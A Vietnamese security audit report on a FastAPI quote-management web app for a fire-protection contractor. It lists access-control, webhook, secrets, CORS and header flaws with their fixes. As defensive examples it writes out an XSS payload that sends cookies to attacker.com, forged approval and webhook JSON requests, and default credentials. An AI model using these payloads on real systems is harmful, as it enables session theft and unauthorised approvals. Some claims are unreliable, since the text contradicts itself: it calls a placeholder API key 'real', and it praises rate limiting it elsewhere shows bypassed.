# BÁO CÁO AUDIT BẢO MẬT TOÀN DIỆN
## HỆ THỐNG QUẢN LÝ BÁO GIÁ & THI CÔNG PCCC (VERTEX CONSTRUCTION & PCCC)
**Người thực hiện:** Security Auditor  
**Thời gian thực hiện:** Tháng 08/2026  
**Phạm vi:** Toàn bộ mã nguồn Web Application, API Routers, Middleware, Database, và Cấu hình hệ thống.

---

## 🏗️ BƯỚC 1 — XÁC ĐỊNH STACK CÔNG NGHỆ

| Thành phần | Công nghệ / Thư viện sử dụng | Đánh giá kiến trúc |
| :--- | :--- | :--- |
| **Backend Framework** | **FastAPI (v0.110+)** trên nền **Python 3.10**, ASGI Server (**Uvicorn / Gunicorn**), Starlette | Framework hiện đại, hiệu năng cao, hỗ trợ Dependency Injection và Pydantic Validation chặt chẽ. |
| **Database** | **SQLite 3** (`storage/vertex_quotes.db`) qua module chuẩn `sqlite3` + Repository Pattern (`app/database/db.py`) | Phù hợp triển khai nhanh/nội bộ; toàn bộ câu lệnh đều dùng Parameterized Query (`?`). |
| **Frontend / Templating**| **Jinja2 SSR** (`app/templates/`), Vanilla HTML5/CSS3/ES6, Leaflet.js (Bản đồ vệ tinh GPS) | Render phía máy chủ kết hợp REST API. |
| **Authentication & RBAC**| **JWT (JSON Web Token)** chuẩn thuật toán `HS256`, Hash mật khẩu `PBKDF2-HMAC-SHA256` (100.000 iterations), Token lưu trữ qua **HttpOnly Cookie** (`access_token`) và Header `Authorization: Bearer` | Có phân quyền đa cấp (Admin, Manager, Staff, Dealer, Partner). |
| **Quản lý Secrets / Env** | **Pydantic BaseSettings** (`pydantic-settings`) đọc từ file `.env` cục bộ (`app/config.py`) | Đang tồn tại giá trị fallback mặc định nhạy cảm (API key, Secret Key) trong code. |

---

## 🚨 TOP 5 LỖ HỔNG CẦN FIX NGAY LẬP TỨC

> [!CAUTION]
> 5 lỗ hổng dưới đây cho phép kẻ tấn công duyệt khống báo giá, leo quyền hệ thống, đánh cắp dữ liệu kinh doanh hoặc rò rỉ API key mà không cần mật khẩu quản trị:

1. **[CRITICAL] Phê duyệt báo giá không cần xác thực qua GET Endpoint:** Link duyệt báo giá [`app/routers/quotes.py:L224-249`](file:///f:/vertex-quote-system/app/routers/quotes.py#L224-L249) không yêu cầu Auth token/HMAC chữ ký, bất kỳ ai có link/ID đều duyệt được.
2. **[CRITICAL] Bỏ qua kiểm tra chữ ký Webhook Zalo OA & Simulator Public:** Endpoint [`app/routers/zalo_webhook.py:L48-54`](file:///f:/vertex-quote-system/app/routers/zalo_webhook.py#L48-L54) và [`/simulate-approval:L111-134`](file:///f:/vertex-quote-system/app/routers/zalo_webhook.py#L111-L134) bỏ qua verify nếu thiếu header hoặc gọi API giả lập duyệt không cần đăng nhập.
3. **[HIGH] Hardcode Groq AI API Key và JWT Secret Key trong mã nguồn:** [`app/config.py:L23`](file:///f:/vertex-quote-system/app/config.py#L23) và [`app/config.py:L29`](file:///f:/vertex-quote-system/app/config.py#L29) chứa API Key thực `gsk_...` và Secret Key mặc định dễ đoán.
4. **[HIGH] Lỗ hổng IDOR xem toàn bộ báo giá và hồ sơ tài chính đối thủ:** Các endpoint [`app/routers/quotes.py:L102-130`](file:///f:/vertex-quote-system/app/routers/quotes.py#L102-L130) cho phép user quyền thấp (Staff/Dealer/Partner) đổi ID để đọc toàn bộ báo giá, tỷ lệ chiết khấu, giá vốn của khách hàng khác.
5. **[HIGH] Stored XSS trong trang hiển thị kết quả duyệt báo giá:** [`app/routers/quotes.py:L250-329`](file:///f:/vertex-quote-system/app/routers/quotes.py#L250-L329) chèn trực tiếp `customer_name`, `project_name` vào HTML mà không escape/sanitize.

---

## 📋 BƯỚC 2 — CHI TIẾT KẾT QUẢ AUDIT BẢO MẬT THEO CHECKLIST

---

### PHẦN 1: AUTHENTICATION & AUTHORIZATION (XÁC THỰC & PHÂN QUYỀN)

#### 🔴 Lỗi 1.1: Phê Duyệt / Từ Chối Báo Giá Qua GET Endpoint Không Có Xác Thực
- **File & Dòng code:** [`app/routers/quotes.py:L224-L249`](file:///f:/vertex-quote-system/app/routers/quotes.py#L224-L249)
- **Mức độ nghiêm trọng:** **CRITICAL**
- **Mô tả:** Endpoint `@router.get("/{quote_id}/approve")` được thiết kế để xử lý click từ tin nhắn Zalo, nhưng nhận tham số `action`, `manager_name`, `reason` qua Query string thuần túy mà **hoàn toàn không có Dependency xác thực** (`current_user`) hoặc token bảo mật một lần (HMAC Signed URL / One-Time Token).
- **Cách thức khai thác:** Kẻ tấn công hoặc người dùng bất kỳ chỉ cần gửi request:
  `GET /api/quotes/{quote_id}/approve?action=approve&manager_name=Hacker`
  Hệ thống sẽ ngay lập tức chuyển trạng thái báo giá thành `APPROVED`, ghi nhận đã duyệt, tính toán tài chính và gửi thông báo xác nhận thành công tới khách hàng mà không cần mật khẩu hay tài khoản Quản lý.
- **Hướng fix đề xuất:**
  - Chuyển thao tác duyệt sang `POST` có JWT Auth của Quản lý (`require_manager_or_admin`).
  - Nếu bắt buộc dùng link click trực tiếp từ Zalo/Email: Tạo chữ ký số HMAC kèm thời hạn sống (expiring signed token) với Secret Key: `/api/quotes/{quote_id}/approve?token={signed_hmac}&action=approve`. Khi nhận request, verify chữ ký và hạn sử dụng trước khi thực thi.

---

#### 🔴 Lỗi 1.2: Endpoint Giả Lập Duyệt `/api/zalo/simulate-approval` Không Có Xác Thực
- **File & Dòng code:** [`app/routers/zalo_webhook.py:L111-L134`](file:///f:/vertex-quote-system/app/routers/zalo_webhook.py#L111-L134)
- **Mức độ nghiêm trọng:** **CRITICAL**
- **Mô tả:** Endpoint `@router.post("/simulate-approval")` được tạo ra để test trên Dashboard nhưng để public hoàn toàn, không có middleware bảo vệ.
- **Cách thức khai thác:** Kẻ tấn công gửi POST request với payload JSON:
  ```json
  {"quote_id": "target_quote_id", "action": "approve", "manager_role": "ADMIN", "manager_name": "Sếp Tiến"}
  ```
  Báo giá sẽ lập tức được duyệt với quyền cao nhất (ADMIN) qua mặt toàn bộ ma trận thẩm quyền (Approval Matrix).
- **Hướng fix đề xuất:**
  - Thêm `current_user: User = Depends(require_manager_or_admin)` vào endpoint này, hoặc đóng hẳn endpoint khi deploy môi trường `production` (`if not settings.DEBUG: raise HTTPException(404)`).

---

#### 🟠 Lỗi 1.3: Lỗ Hổng IDOR (Insecure Direct Object Reference) Tại Chi Tiết Báo Giá & Audit Logs
- **File & Dòng code:** [`app/routers/quotes.py:L102-L130`](file:///f:/vertex-quote-system/app/routers/quotes.py#L102-L130)
- **Mức độ nghiêm trọng:** **HIGH**
- **Mô tả:** Các API `GET /api/quotes/{quote_id}`, `GET /api/quotes/{quote_id}/versions`, `GET /api/quotes/{quote_id}/audit-logs` và `GET /api/quotes/{quote_id}/download` có kiểm tra đăng nhập (`get_current_user`), nhưng **không kiểm tra quyền sở hữu đối tượng**.
- **Cách thức khai thác:** Một tài khoản Đại lý (`DEALER`) hoặc Kỹ sư (`STAFF`) sau khi đăng nhập có thể đổi `quote_id` trên URL/API thành ID của các dự án trọng điểm khác để tải trọn bộ bảng dự toán, giá vốn nhập hàng, biên lợi nhuận, danh sách nhà thầu phụ và nhật ký nội bộ của công ty.
- **Hướng fix đề xuất:**
  - Bổ sung logic kiểm tra quyền sở hữu tại `QuoteService`: Nếu user có role `STAFF`, `DEALER`, `PARTNER`, chỉ cho phép xem các báo giá do chính user đó tạo (`created_by_user_id == current_user.id`). Chỉ `MANAGER` và `ADMIN` mới có quyền xem toàn bộ.

---

#### 🟠 Lỗi 1.4: Tải Lên & Kích Hoạt File Mẫu Định Mức Thiếu Phân Quyền Quản Lý
- **File & Dòng code:** [`app/routers/templates.py:L65-L76`](file:///f:/vertex-quote-system/app/routers/templates.py#L65-L76)
- **Mức độ nghiêm trọng:** **HIGH**
- **Mô tả:** Endpoint `POST /api/templates/upload` dùng `Depends(get_current_user)` thay vì `require_manager_or_admin`. Đồng thời tham số `set_active: bool = Form(True)` cho phép bất kỳ user nào vừa upload file mẫu vừa đặt nó làm mẫu mặc định toàn công ty.
- **Cách thức khai thác:** Một nhân viên mới hoặc đại lý có thể upload file mẫu Excel bị sai lệch hệ số định mức (% hao hụt, % nhân công, % lợi nhuận) và kích hoạt làm mẫu chuẩn (`is_active=1`), làm toàn bộ báo giá PCCC tạo mới sau đó bị sai lệch đơn giá nghiêm trọng.
- **Hướng fix đề xuất:**
  - Đổi dependency thành `current_user: User = Depends(require_manager_or_admin)`.

---

#### 🟡 Lỗi 1.5: Cookie JWT Thiếu Cờ `secure=True` Trên Môi Trường Production
- **File & Dòng code:** [`app/routers/auth.py:L190-L196`](file:///f:/vertex-quote-system/app/routers/auth.py#L190-L196)
- **Mức độ nghiêm trọng:** **MEDIUM**
- **Mô tả:** Khi user đăng nhập, cookie `access_token` được thiết lập với `httponly=True` và `samesite="lax"`, nhưng **thiếu thuộc tính `secure=True`**.
- **Cách thức khai thác:** Trong môi trường mạng nội bộ hoặc wifi công cộng, nếu người dùng vô tình truy cập qua giao thức HTTP không mã hóa, cookie xác thực có thể bị nghe lén (Man-in-the-Middle - MitM).
- **Hướng fix đề xuất:**
  ```python
  response.set_cookie(
      key="access_token",
      value=access_token,
      httponly=True,
      secure=(settings.APP_ENV == "production"), # Chỉ gửi qua HTTPS
      max_age=86400,
      samesite="lax"
  )
  ```

---

### PHẦN 2: API & INPUT VALIDATION (KIỂM SOÁT ĐẦU VÀO, SQLi, XSS, RATE LIMIT)

#### 🟠 Lỗi 2.1: Stored Cross-Site Scripting (Stored XSS) Trong Trang HTML Phê Duyệt
- **File & Dòng code:** [`app/routers/quotes.py:L250-L329`](file:///f:/vertex-quote-system/app/routers/quotes.py#L250-L329)
- **Mức độ nghiêm trọng:** **HIGH**
- **Mô tả:** Khi trả về trang HTML thông báo kết quả duyệt, các trường `quote.customer_name`, `quote.project_name`, `manager_name`, `reason` được format trực tiếp vào chuỗi f-string Python mà không qua hàm escape HTML (như `html.escape()` trong Python hay template auto-escaping của Jinja2).
- **Cách thức khai thác:** Kẻ tấn công tạo báo giá với Tên Khách Hàng:
  `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
  hoặc `<img src=x onerror="alert(document.domain)">`. Khi Quản lý hoặc Giám đốc mở link xem kết quả duyệt, mã JavaScript độc hại sẽ được thực thi ngay trên trình duyệt của sếp.
- **Hướng fix đề xuất:**
  - Sử dụng module `html.escape(quote.customer_name)` trước khi ghép chuỗi, hoặc tốt nhất là render qua Jinja2 template chuyên dụng có bật cơ chế Auto-escape mặc định.

---

#### 🟢 Đánh Giá 2.2: Phòng Chống SQL Injection (SQLi)
- **File liên quan:** [`app/database/db.py:L400-L1168`](file:///f:/vertex-quote-system/app/database/db.py#L400-L1168)
- **Mức độ nghiêm trọng:** **AN TOÀN (Passed)**
- **Đánh giá:** Toàn bộ các câu truy vấn cơ sở dữ liệu (`SELECT`, `INSERT`, `UPDATE`, `DELETE`) trong repository `db.py` đều sử dụng câu lệnh chuẩn bị sẵn (Parameterized Queries) với placeholder `?` của SQLite (ví dụ: `cursor.execute("SELECT * FROM quotes WHERE id = ?", (quote_id,))`). Không phát hiện lỗi nối chuỗi thô (Raw String Concatenation) trong SQL.

---

#### 🟡 Lỗi 2.3: Bypass Rate Limiting Qua Giả Mạo Header `X-Forwarded-For`
- **File & Dòng code:** [`app/middlewares/rate_limiter.py:L42-L54`](file:///f:/vertex-quote-system/app/middlewares/rate_limiter.py#L42-L54)
- **Mức độ nghiêm trọng:** **MEDIUM**
- **Mô tả:** Hàm `_get_client_ip()` lấy địa chỉ IP từ header `X-Forwarded-For` mà không kiểm tra xem request có đến từ một Reverse Proxy đáng tin cậy (Trusted Proxy / Nginx / Cloudflare) hay không.
- **Cách thức khai thác:** Kẻ tấn công thực hiện tấn công Brute-Force mật khẩu đăng nhập tại `/api/auth/login` hoặc spam tạo báo giá `/api/quotes/upload` bằng cách đổi giá trị header `X-Forwarded-For: 1.1.1.{i}` ngẫu nhiên trên mỗi request. Thuật toán Rate Limiter sẽ coi mỗi request là một IP khác nhau và không bao giờ kích hoạt giới hạn chặn.
- **Hướng fix đề xuất:**
  - Chỉ tin tưởng `X-Forwarded-For` khi IP kết nối trực tiếp (`request.client.host`) nằm trong danh sách IP Proxy nội bộ (ví dụ: `127.0.0.1`, dải IP của Docker/Kubernetes gateway).

---

### PHẦN 3: FILE UPLOAD VÀ THỰC THI MÃ ĐỘC (WEBSHELL, CAD/EXCEL EXPLOITS)

#### 🟢 Đánh Giá 3.1: Kiểm Tra Giới Hạn Dung Lượng & Magic Bytes
- **File liên quan:** [`app/services/file_validator.py:L12-L131`](file:///f:/vertex-quote-system/app/services/file_validator.py#L12-L131)
- **Mức độ nghiêm trọng:** **AN TOÀN (Passed)**
- **Đánh giá:**
  - **Giới hạn dung lượng:** Ép buộc kiểm tra chặt chẽ `MAX_FILE_SIZE_BYTES = 50MB` theo từng chunk stream 64KB, chủ động xóa tệp nếu vượt ngưỡng.
  - **Kiểm tra chữ ký nhị phân (Magic Bytes):** Đã cấu hình chữ ký chuẩn cho `.xlsx` (`PK..`), `.xls` (`\xd0\xcf...`), `.pdf` (`%PDF-`), `.dwg` (`AC10...`) và kiểm tra binary injection đối với `.dxf`, `.csv`.
  - **Vị trí lưu trữ:** File được lưu tại `storage/uploads/` nằm ngoài thư mục public static web (`/static`), không có quyền thực thi script (No Execution), tải về qua controller an toàn.

---

### PHẦN 4: WEBHOOK ZALO OFFICIAL ACCOUNT (OA)

#### 🔴 Lỗi 4.1: Bỏ Qua Kiểm Tra Chữ Ký Khi Header `X-Zalo-Signature` Bị Bỏ Trống
- **File & Dòng code:** [`app/routers/zalo_webhook.py:L49-L54`](file:///f:/vertex-quote-system/app/routers/zalo_webhook.py#L49-L54) và [`app/services/zalo_service.py:L31-L40`](file:///f:/vertex-quote-system/app/services/zalo_service.py#L31-L40)
- **Mức độ nghiêm trọng:** **CRITICAL**
- **Mô tả:** Trong endpoint `@router.post("/webhook")`, logic kiểm tra chữ ký được viết:
  ```python
  if x_zalo_signature:
      is_valid = zalo_service.verify_webhook_signature(body_bytes, x_zalo_signature)
      if not is_valid and not settings.DEBUG:
          raise HTTPException(status_code=403, detail="Invalid signature")
  ```
  Và trong `verify_webhook_signature`:
  ```python
  if not signature or not self.secret_key:
      return True  # Bypass in dev if no key configured
  ```
- **Cách thức khai thác:** Kẻ tấn công gửi trực tiếp POST request tới `/api/zalo/webhook` **mà không đính kèm header `X-Zalo-Signature`**. Điều kiện `if x_zalo_signature:` sẽ trả về `False` và toàn bộ bước xác thực bị bỏ qua hoàn toàn! Kẻ tấn công có thể giả mạo sự kiện `user_submit_action` hoặc `user_send_text` để phê duyệt bất kỳ báo giá nào:
  ```json
  {
    "event_name": "user_submit_action",
    "info": {"data": {"action": "approve", "quote_id": "VTX-2026-0001"}},
    "sender": {"id": "FakeManager"}
  }
  ```
- **Hướng fix đề xuất:**
  - Bắt buộc kiểm tra chữ ký ở môi trường production:
  ```python
  if not settings.DEBUG:
      if not x_zalo_signature:
          raise HTTPException(status_code=401, detail="Missing X-Zalo-Signature header")
      if not zalo_service.verify_webhook_signature(body_bytes, x_zalo_signature):
          raise HTTPException(status_code=403, detail="Invalid Zalo signature")
  ```

---

### PHẦN 5: QUẢN LÝ SECRETS & BIẾN MÔI TRƯỜNG (SECRETS LEAKAGE)

#### 🟠 Lỗi 5.1: Hardcode Groq API Key Thực Trong File Cấu Hình Mã Nguồn
- **File & Dòng code:** [`app/config.py:L29`](file:///f:/vertex-quote-system/app/config.py#L29)
- **Mức độ nghiêm trọng:** **HIGH**
- **Mô tả:** Key AI API được gán giá trị mặc định trực tiếp trong code:
  `AI_API_KEY: str = "gsk_your_groq_api_key_here"`
- **Cách thức khai thác:** Bất kỳ lập trình viên, bên thứ ba hoặc người có quyền truy cập repo Git đều có thể trích xuất API Key này để sử dụng trái phép hạn ngạch (quota) AI LLM của công ty hoặc gây phát sinh chi phí.
- **Hướng fix đề xuất:**
  - Xóa chuỗi key thực khỏi `app/config.py`, chỉ để `AI_API_KEY: str = Field(default="", env="AI_API_KEY")`.
  - **Khuyến cáo khẩn cấp:** Cần đăng nhập vào Groq Console và thực hiện **Rotate / Revoke (Thu hồi)** ngay lập tức key Groq cũ vì đã từng xuất hiện trên máy tính phát triển.

---

#### 🟡 Lỗi 5.2: Sử Dụng Secret Key Mặc Định Dễ Đoán Cho JWT
- **File & Dòng code:** [`app/config.py:L23`](file:///f:/vertex-quote-system/app/config.py#L23)
- **Mức độ nghiêm trọng:** **MEDIUM**
- **Mô tả:** `SECRET_KEY` mặc định được đặt là `"vertex-secret-key-change-in-production"`. Dù `main.py` có in warning khi chạy production, nhưng ứng dụng không cưỡng chế dừng (abort) nếu key chưa được đổi.
- **Cách thức khai thác:** Kẻ tấn công sử dụng key mặc định này để tự ký (forge) token JWT với role `ADMIN` và ID bất kỳ, đăng nhập vào hệ thống mà không cần mật khẩu.
- **Hướng fix đề xuất:**
  - Nếu `APP_ENV == "production"` và `SECRET_KEY` là giá trị mặc định hoặc độ dài < 32 ký tự, ứng dụng phải raise Exception dừng khởi động ngay lập tức.

---

#### 🟡 Lỗi 5.3: Mật Khẩu Khởi Tạo Mặc Định Trong Database Seeder
- **File & Dòng code:** [`app/database/db.py:L302, L312, L322`](file:///f:/vertex-quote-system/app/database/db.py#L302)
- **Mức độ nghiêm trọng:** **LOW / INFORMATIONAL**
- **Mô tả:** Tài khoản admin (`admin`), manager (`viet_manager`) và engineer (`quang_engineer`) được khởi tạo sẵn với mật khẩu mặc định `"Vertex@2026"` và salt tĩnh `"vertex_pccc_salt_2026"`.
- **Hướng fix đề xuất:**
  - Khi triển khai thực tế trên server production, hệ thống cần yêu cầu người dùng đổi mật khẩu bắt buộc ở lần đăng nhập đầu tiên (Force Password Reset on First Login).

---

### PHẦN 6: HTTPS, CORS & CÁC SECURITY HEADERS

#### 🟠 Lỗi 6.1: Cấu Hình CORS Cho Phép Wildcard `*` Đi Kèm `allow_credentials=True`
- **File & Dòng code:** [`main.py:L74-L81`](file:///f:/vertex-quote-system/main.py#L74-L81)
- **Mức độ nghiêm trọng:** **HIGH**
- **Mô tả:** Cấu hình CORS hiện tại:
  ```python
  app.add_middleware(
      CORSMiddleware,
      allow_origins=["*"],
      allow_credentials=True,
      allow_methods=["*"],
      allow_headers=["*"],
  )
  ```
  Theo đặc tả kỹ thuật CORS và tiêu chuẩn bảo mật W3C, việc kết hợp `allow_origins=["*"]` cùng `allow_credentials=True` là cấu hình sai (CORS Misconfiguration), có thể khiến trình duyệt bỏ qua hoặc mở ra nguy cơ tấn công Cross-Origin data theft nếu có các trang web độc hại nhúng script gọi API.
- **Hướng fix đề xuất:**
  - Chỉ định rõ danh sách origin được phép trong môi trường production, ví dụ:
  ```python
  origins = [settings.BASE_URL] if settings.APP_ENV == "production" else ["*"]
  ```

---

#### 🟡 Lỗi 6.2: Thiếu Header Content-Security-Policy (CSP) & Cấu Hình HSTS Chưa Tối Ưu
- **File & Dòng code:** [`app/middlewares/security_headers.py:L1-L39`](file:///f:/vertex-quote-system/app/middlewares/security_headers.py#L1-L39)
- **Mức độ nghiêm trọng:** **MEDIUM**
- **Mô tả:**
  - Thiếu header `Content-Security-Policy` (CSP) để ngăn chặn việc nạp các script độc hại từ bên ngoài.
  - Header `Strict-Transport-Security` (HSTS) chỉ được gắn khi `request.url.scheme == "https"`. Khi chạy sau Reverse Proxy (Nginx/Cloudflare), scheme nội bộ có thể là `http`, dẫn tới response trả về cho client bị thiếu HSTS.
  - Cấu hình `Permissions-Policy: geolocation=()` ở dòng 29 có thể làm vô hiệu hóa API định vị GPS mà module Chấm Công Hiện Trường đang cần dùng.
- **Hướng fix đề xuất:**
  - Bổ sung CSP header với whitelist domain cho FontAwesome, Google Maps và Leaflet.
  - Sửa `Permissions-Policy` thành `geolocation=(self)` để cấp phép định vị cho ứng dụng hiện trường.
  - Gắn header HSTS mặc định trên môi trường production.

---

## 📊 BẢNG TỔNG HỢP MA TRẬN RỦI RO (RISK MATRIX)

| Mã Lỗi | Tên Lỗ Hổng | Phân Loại | File Liên Quan | Mức Độ | Trạng Thái |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **VULN-01** | Bỏ qua Auth duyệt báo giá qua GET endpoint | Broken Access Control | [`app/routers/quotes.py`](file:///f:/vertex-quote-system/app/routers/quotes.py#L224) | **CRITICAL** | Cần fix ngay |
| **VULN-02** | Bỏ qua chữ ký Zalo Webhook & Simulator public | Broken Authentication | [`app/routers/zalo_webhook.py`](file:///f:/vertex-quote-system/app/routers/zalo_webhook.py#L49) | **CRITICAL** | Cần fix ngay |
| **VULN-03** | Hardcode Groq AI API Key trong code | Secrets Exposure | [`app/config.py`](file:///f:/vertex-quote-system/app/config.py#L29) | **HIGH** | Cần rotate key |
| **VULN-04** | IDOR xem toàn bộ báo giá và hồ sơ tài chính | Broken Access Control | [`app/routers/quotes.py`](file:///f:/vertex-quote-system/app/routers/quotes.py#L102) | **HIGH** | Cần fix ngay |
| **VULN-05** | Stored XSS trong trang HTML thông báo duyệt | Cross-Site Scripting | [`app/routers/quotes.py`](file:///f:/vertex-quote-system/app/routers/quotes.py#L250) | **HIGH** | Cần fix ngay |
| **VULN-06** | CORS Misconfiguration (`*` + credentials) | Security Misconfig | [`main.py`](file:///f:/vertex-quote-system/main.py#L74) | **HIGH** | Cần sửa config |
| **VULN-07** | Upload Master Template thiếu check quyền Manager | Privilege Escalation | [`app/routers/templates.py`](file:///f:/vertex-quote-system/app/routers/templates.py#L65) | **HIGH** | Cần sửa role |
| **VULN-08** | Bypass Rate Limit qua giả mạo IP `X-Forwarded-For` | Anti-Abuse Bypass | [`app/middlewares/rate_limiter.py`](file:///f:/vertex-quote-system/app/middlewares/rate_limiter.py#L42) | **MEDIUM** | Cần fix |
| **VULN-09** | Thiếu Content-Security-Policy & cờ Cookie Secure | Security Headers | [`app/middlewares/security_headers.py`](file:///f:/vertex-quote-system/app/middlewares/security_headers.py#L1) | **MEDIUM** | Cần bổ sung |
| **VULN-10** | Default Admin Password trong DB Seeder | Weak Credentials | [`app/database/db.py`](file:///f:/vertex-quote-system/app/database/db.py#L302) | **LOW** | Cần chính sách |

---

## 🎯 KẾT LUẬN & LỘ TRÌNH KHẮC PHỤC
Hệ thống có nền tảng phòng thủ tốt ở tầng **File Upload (Magic Bytes + File Size)**, **SQL Injection (100% Parameterized Queries)** và **Rate Limiting**. 

Tuy nhiên, các lỗ hổng nghiêm trọng tập trung chủ yếu ở:
1. Cơ chế phê duyệt nhanh qua Link Zalo / Webhook callback cần được siết chặt bằng chữ ký số HMAC và Access Control.
2. Cần phân quyền chặt chẽ cấp độ dữ liệu (Data-level Authorization) để ngăn chặn IDOR giữa các người dùng.
3. Rà soát và loại bỏ toàn bộ API key/Secrets hardcoded khỏi file cấu hình trước khi triển khai môi trường thực tế.
